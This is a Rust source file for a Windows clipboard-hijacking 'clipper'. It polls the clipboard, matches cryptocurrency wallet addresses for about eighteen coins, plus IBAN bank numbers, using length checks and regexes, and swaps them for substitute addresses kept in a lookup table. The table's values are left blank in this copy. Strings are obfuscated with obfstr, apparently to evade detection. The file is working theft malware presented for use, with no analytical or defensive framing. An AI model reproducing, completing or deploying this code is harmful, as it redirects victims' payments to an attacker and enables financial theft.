use regex::Regex;

// sry for awful code lol coded this a while ago

use once_cell::sync::OnceCell;
use std::{collections::HashMap, sync::Mutex};



use clipboard_win::get_clipboard;
use clipboard_win::{formats, set_clipboard_string};
fn copy_to_clipboard(text: &str) {
    // thx stackoverflow :joy:

    println!("{} - {}", text, text.len());
    let err = set_clipboard_string(text);
    if err.is_ok() {
        println!("{}", err.is_ok());
    }
}

pub fn get() -> Option<String> {
    let clipboard: Result<String, _> = get_clipboard(formats::Unicode);

    if clipboard.is_ok() {
        return Some(clipboard.unwrap());
    } else {
        return None;
    }
}

pub fn clipper() {
    let mut prev_content = String::new();
    #[allow(unused_assignments)]
    let mut clipboard: String = String::new();

    loop {
        let result = get();

        if result.is_some() {
            clipboard = result.unwrap();

            if !(clipboard == prev_content) {
                prev_content = clipboard.clone();

                // User has copied something new
                let has_addr = has_address(&clipboard);

                if has_addr.len() > 0 {
                    let _ = replace_address(&has_addr);
                }
            }
        } else {
            std::thread::sleep(std::time::Duration::from_millis(1000)); // sleep longer if error
        }

        std::thread::sleep(std::time::Duration::from_millis(250));
    }
}

fn replaced() -> &'static Mutex<HashMap<String, &'static str>> {
    static INSTANCE: OnceCell<Mutex<HashMap<String, &'static str>>> = OnceCell::new();
    INSTANCE.get_or_init(|| {
        let mut hm = HashMap::new();
        hm.insert(obfstr::obfstr!("XMR").to_string(), "");
        hm.insert(obfstr::obfstr!("BNB").to_string(), "");
        hm.insert(obfstr::obfstr!("TRX").to_string(), "");
        hm.insert(obfstr::obfstr!("ETH").to_string(), "");
        hm.insert(obfstr::obfstr!("BTC").to_string(), "");
        hm.insert(obfstr::obfstr!("DOGE").to_string(), "");
        hm.insert(obfstr::obfstr!("BCH").to_string(), "");
        hm.insert(obfstr::obfstr!("LTC").to_string(), "");
        hm.insert(obfstr::obfstr!("DASH").to_string(), "");
        hm.insert(obfstr::obfstr!("XRP").to_string(), "");
        hm.insert(obfstr::obfstr!("ADA").to_string(), "");
        hm.insert(obfstr::obfstr!("TON").to_string(), "");
        hm.insert(obfstr::obfstr!("NEO").to_string(), "");
        hm.insert(obfstr::obfstr!("ETC").to_string(), "");
        hm.insert(obfstr::obfstr!("SOL").to_string(), "");
        hm.insert(obfstr::obfstr!("ZEC").to_string(), "");
        hm.insert(obfstr::obfstr!("ALGO").to_string(), "");
        hm.insert(obfstr::obfstr!("XLM").to_string(), "");
        hm.insert(obfstr::obfstr!("IBAN").to_string(), "");
        Mutex::new(hm)
    })
}

pub fn replace_address(crypto: &str) -> String {
    if replaced().lock().unwrap().get(crypto).unwrap().len() < 1 {
        return String::new();
    }

    let _ = copy_to_clipboard(replaced().lock().unwrap().get(crypto).unwrap());
    crypto.to_string()
}

pub fn has_address(address: &str) -> String {

    if address.len() < 3 {
        return String::new();
    }

    if address.len() == 95 && address.chars().next().unwrap() == '4' {
        return obfstr::obfstr!("XMR").to_string();
    }

    if address.len() == 42 && address.starts_with("bnb1") {
        return obfstr::obfstr!("BNB").to_string();
    }

    if address.len() == 34 && address.chars().next().unwrap() == 'T' {
        return obfstr::obfstr!("TRX").to_string();
    }

    if address.len() == 42 && address.starts_with("0x3f") {
        return obfstr::obfstr!("ETC").to_string();
    }

    if address.len() == 42 && address.starts_with("0x") {
        return obfstr::obfstr!("ETH").to_string();
    }

    if address.len() == 35 && address.starts_with("t1") {
        return obfstr::obfstr!("ZEC").to_string();
    }

    if (address.len() == 42 && address.starts_with("bc1"))
        || (address.len() == 34 && address.starts_with("1"))
        || (address.len() == 34 && address.starts_with("3"))
    {
        return obfstr::obfstr!("BTC").to_string();
    }

    if (address.len() == 48) && (address.contains("-") || address.contains("_")) {
        return obfstr::obfstr!("TON").to_string();
    }

    if address.len() == 58 && Regex::new(obfstr::obfstr!("[A-Z2-7]{58}")).unwrap().is_match(address) {
        return obfstr::obfstr!("ALGO").to_string();
    }

    if address.len() == 56
        && address.starts_with("G")
        && Regex::new(obfstr::obfstr!("[A-Z2-7]{58}"))
            .unwrap()
            .is_match(&(address.to_owned() + "AA"))
    {
        return obfstr::obfstr!("XLM").to_string();
    }

    let mut regexes = HashMap::new();
    regexes.insert(obfstr::obfstr!("DOGE").to_string(),obfstr::obfstr!("(?:^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$)").to_string());
    regexes.insert(obfstr::obfstr!("BCH").to_string(), obfstr::obfstr!("(?:^((bitcoincash|bchreg):)?(q|p)[a-z0-9]{41}$)").to_string());
    regexes.insert(obfstr::obfstr!("LTC").to_string(), obfstr::obfstr!("(?:^(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,40}$)").to_string());
    regexes.insert(obfstr::obfstr!("DASH").to_string(),obfstr::obfstr!("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)").to_string());
    regexes.insert(obfstr::obfstr!("XRP").to_string(), obfstr::obfstr!("(?:^r[0-9a-zA-Z]{24,34}$)").to_string());
    regexes.insert(obfstr::obfstr!("ADA").to_string(), obfstr::obfstr!("^D[A-NP-Za-km-z1-9]{35,}$").to_string());
    regexes.insert(obfstr::obfstr!("NEO").to_string(), obfstr::obfstr!("(?:^A[0-9a-zA-Z]{33}$)").to_string());
    regexes.insert(obfstr::obfstr!("SOL").to_string(), obfstr::obfstr!("(^[1-9A-HJ-NP-Za-km-z]{32,44}$)").to_string());
    regexes.insert(
        obfstr::obfstr!("IBAN").to_string(),
        obfstr::obfstr!("[a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16}").to_string());

    for (coin, regex) in regexes.iter() {
        if Regex::new(regex).unwrap().is_match(address) {
            return coin.to_string();
        }
    }

    String::new()
}
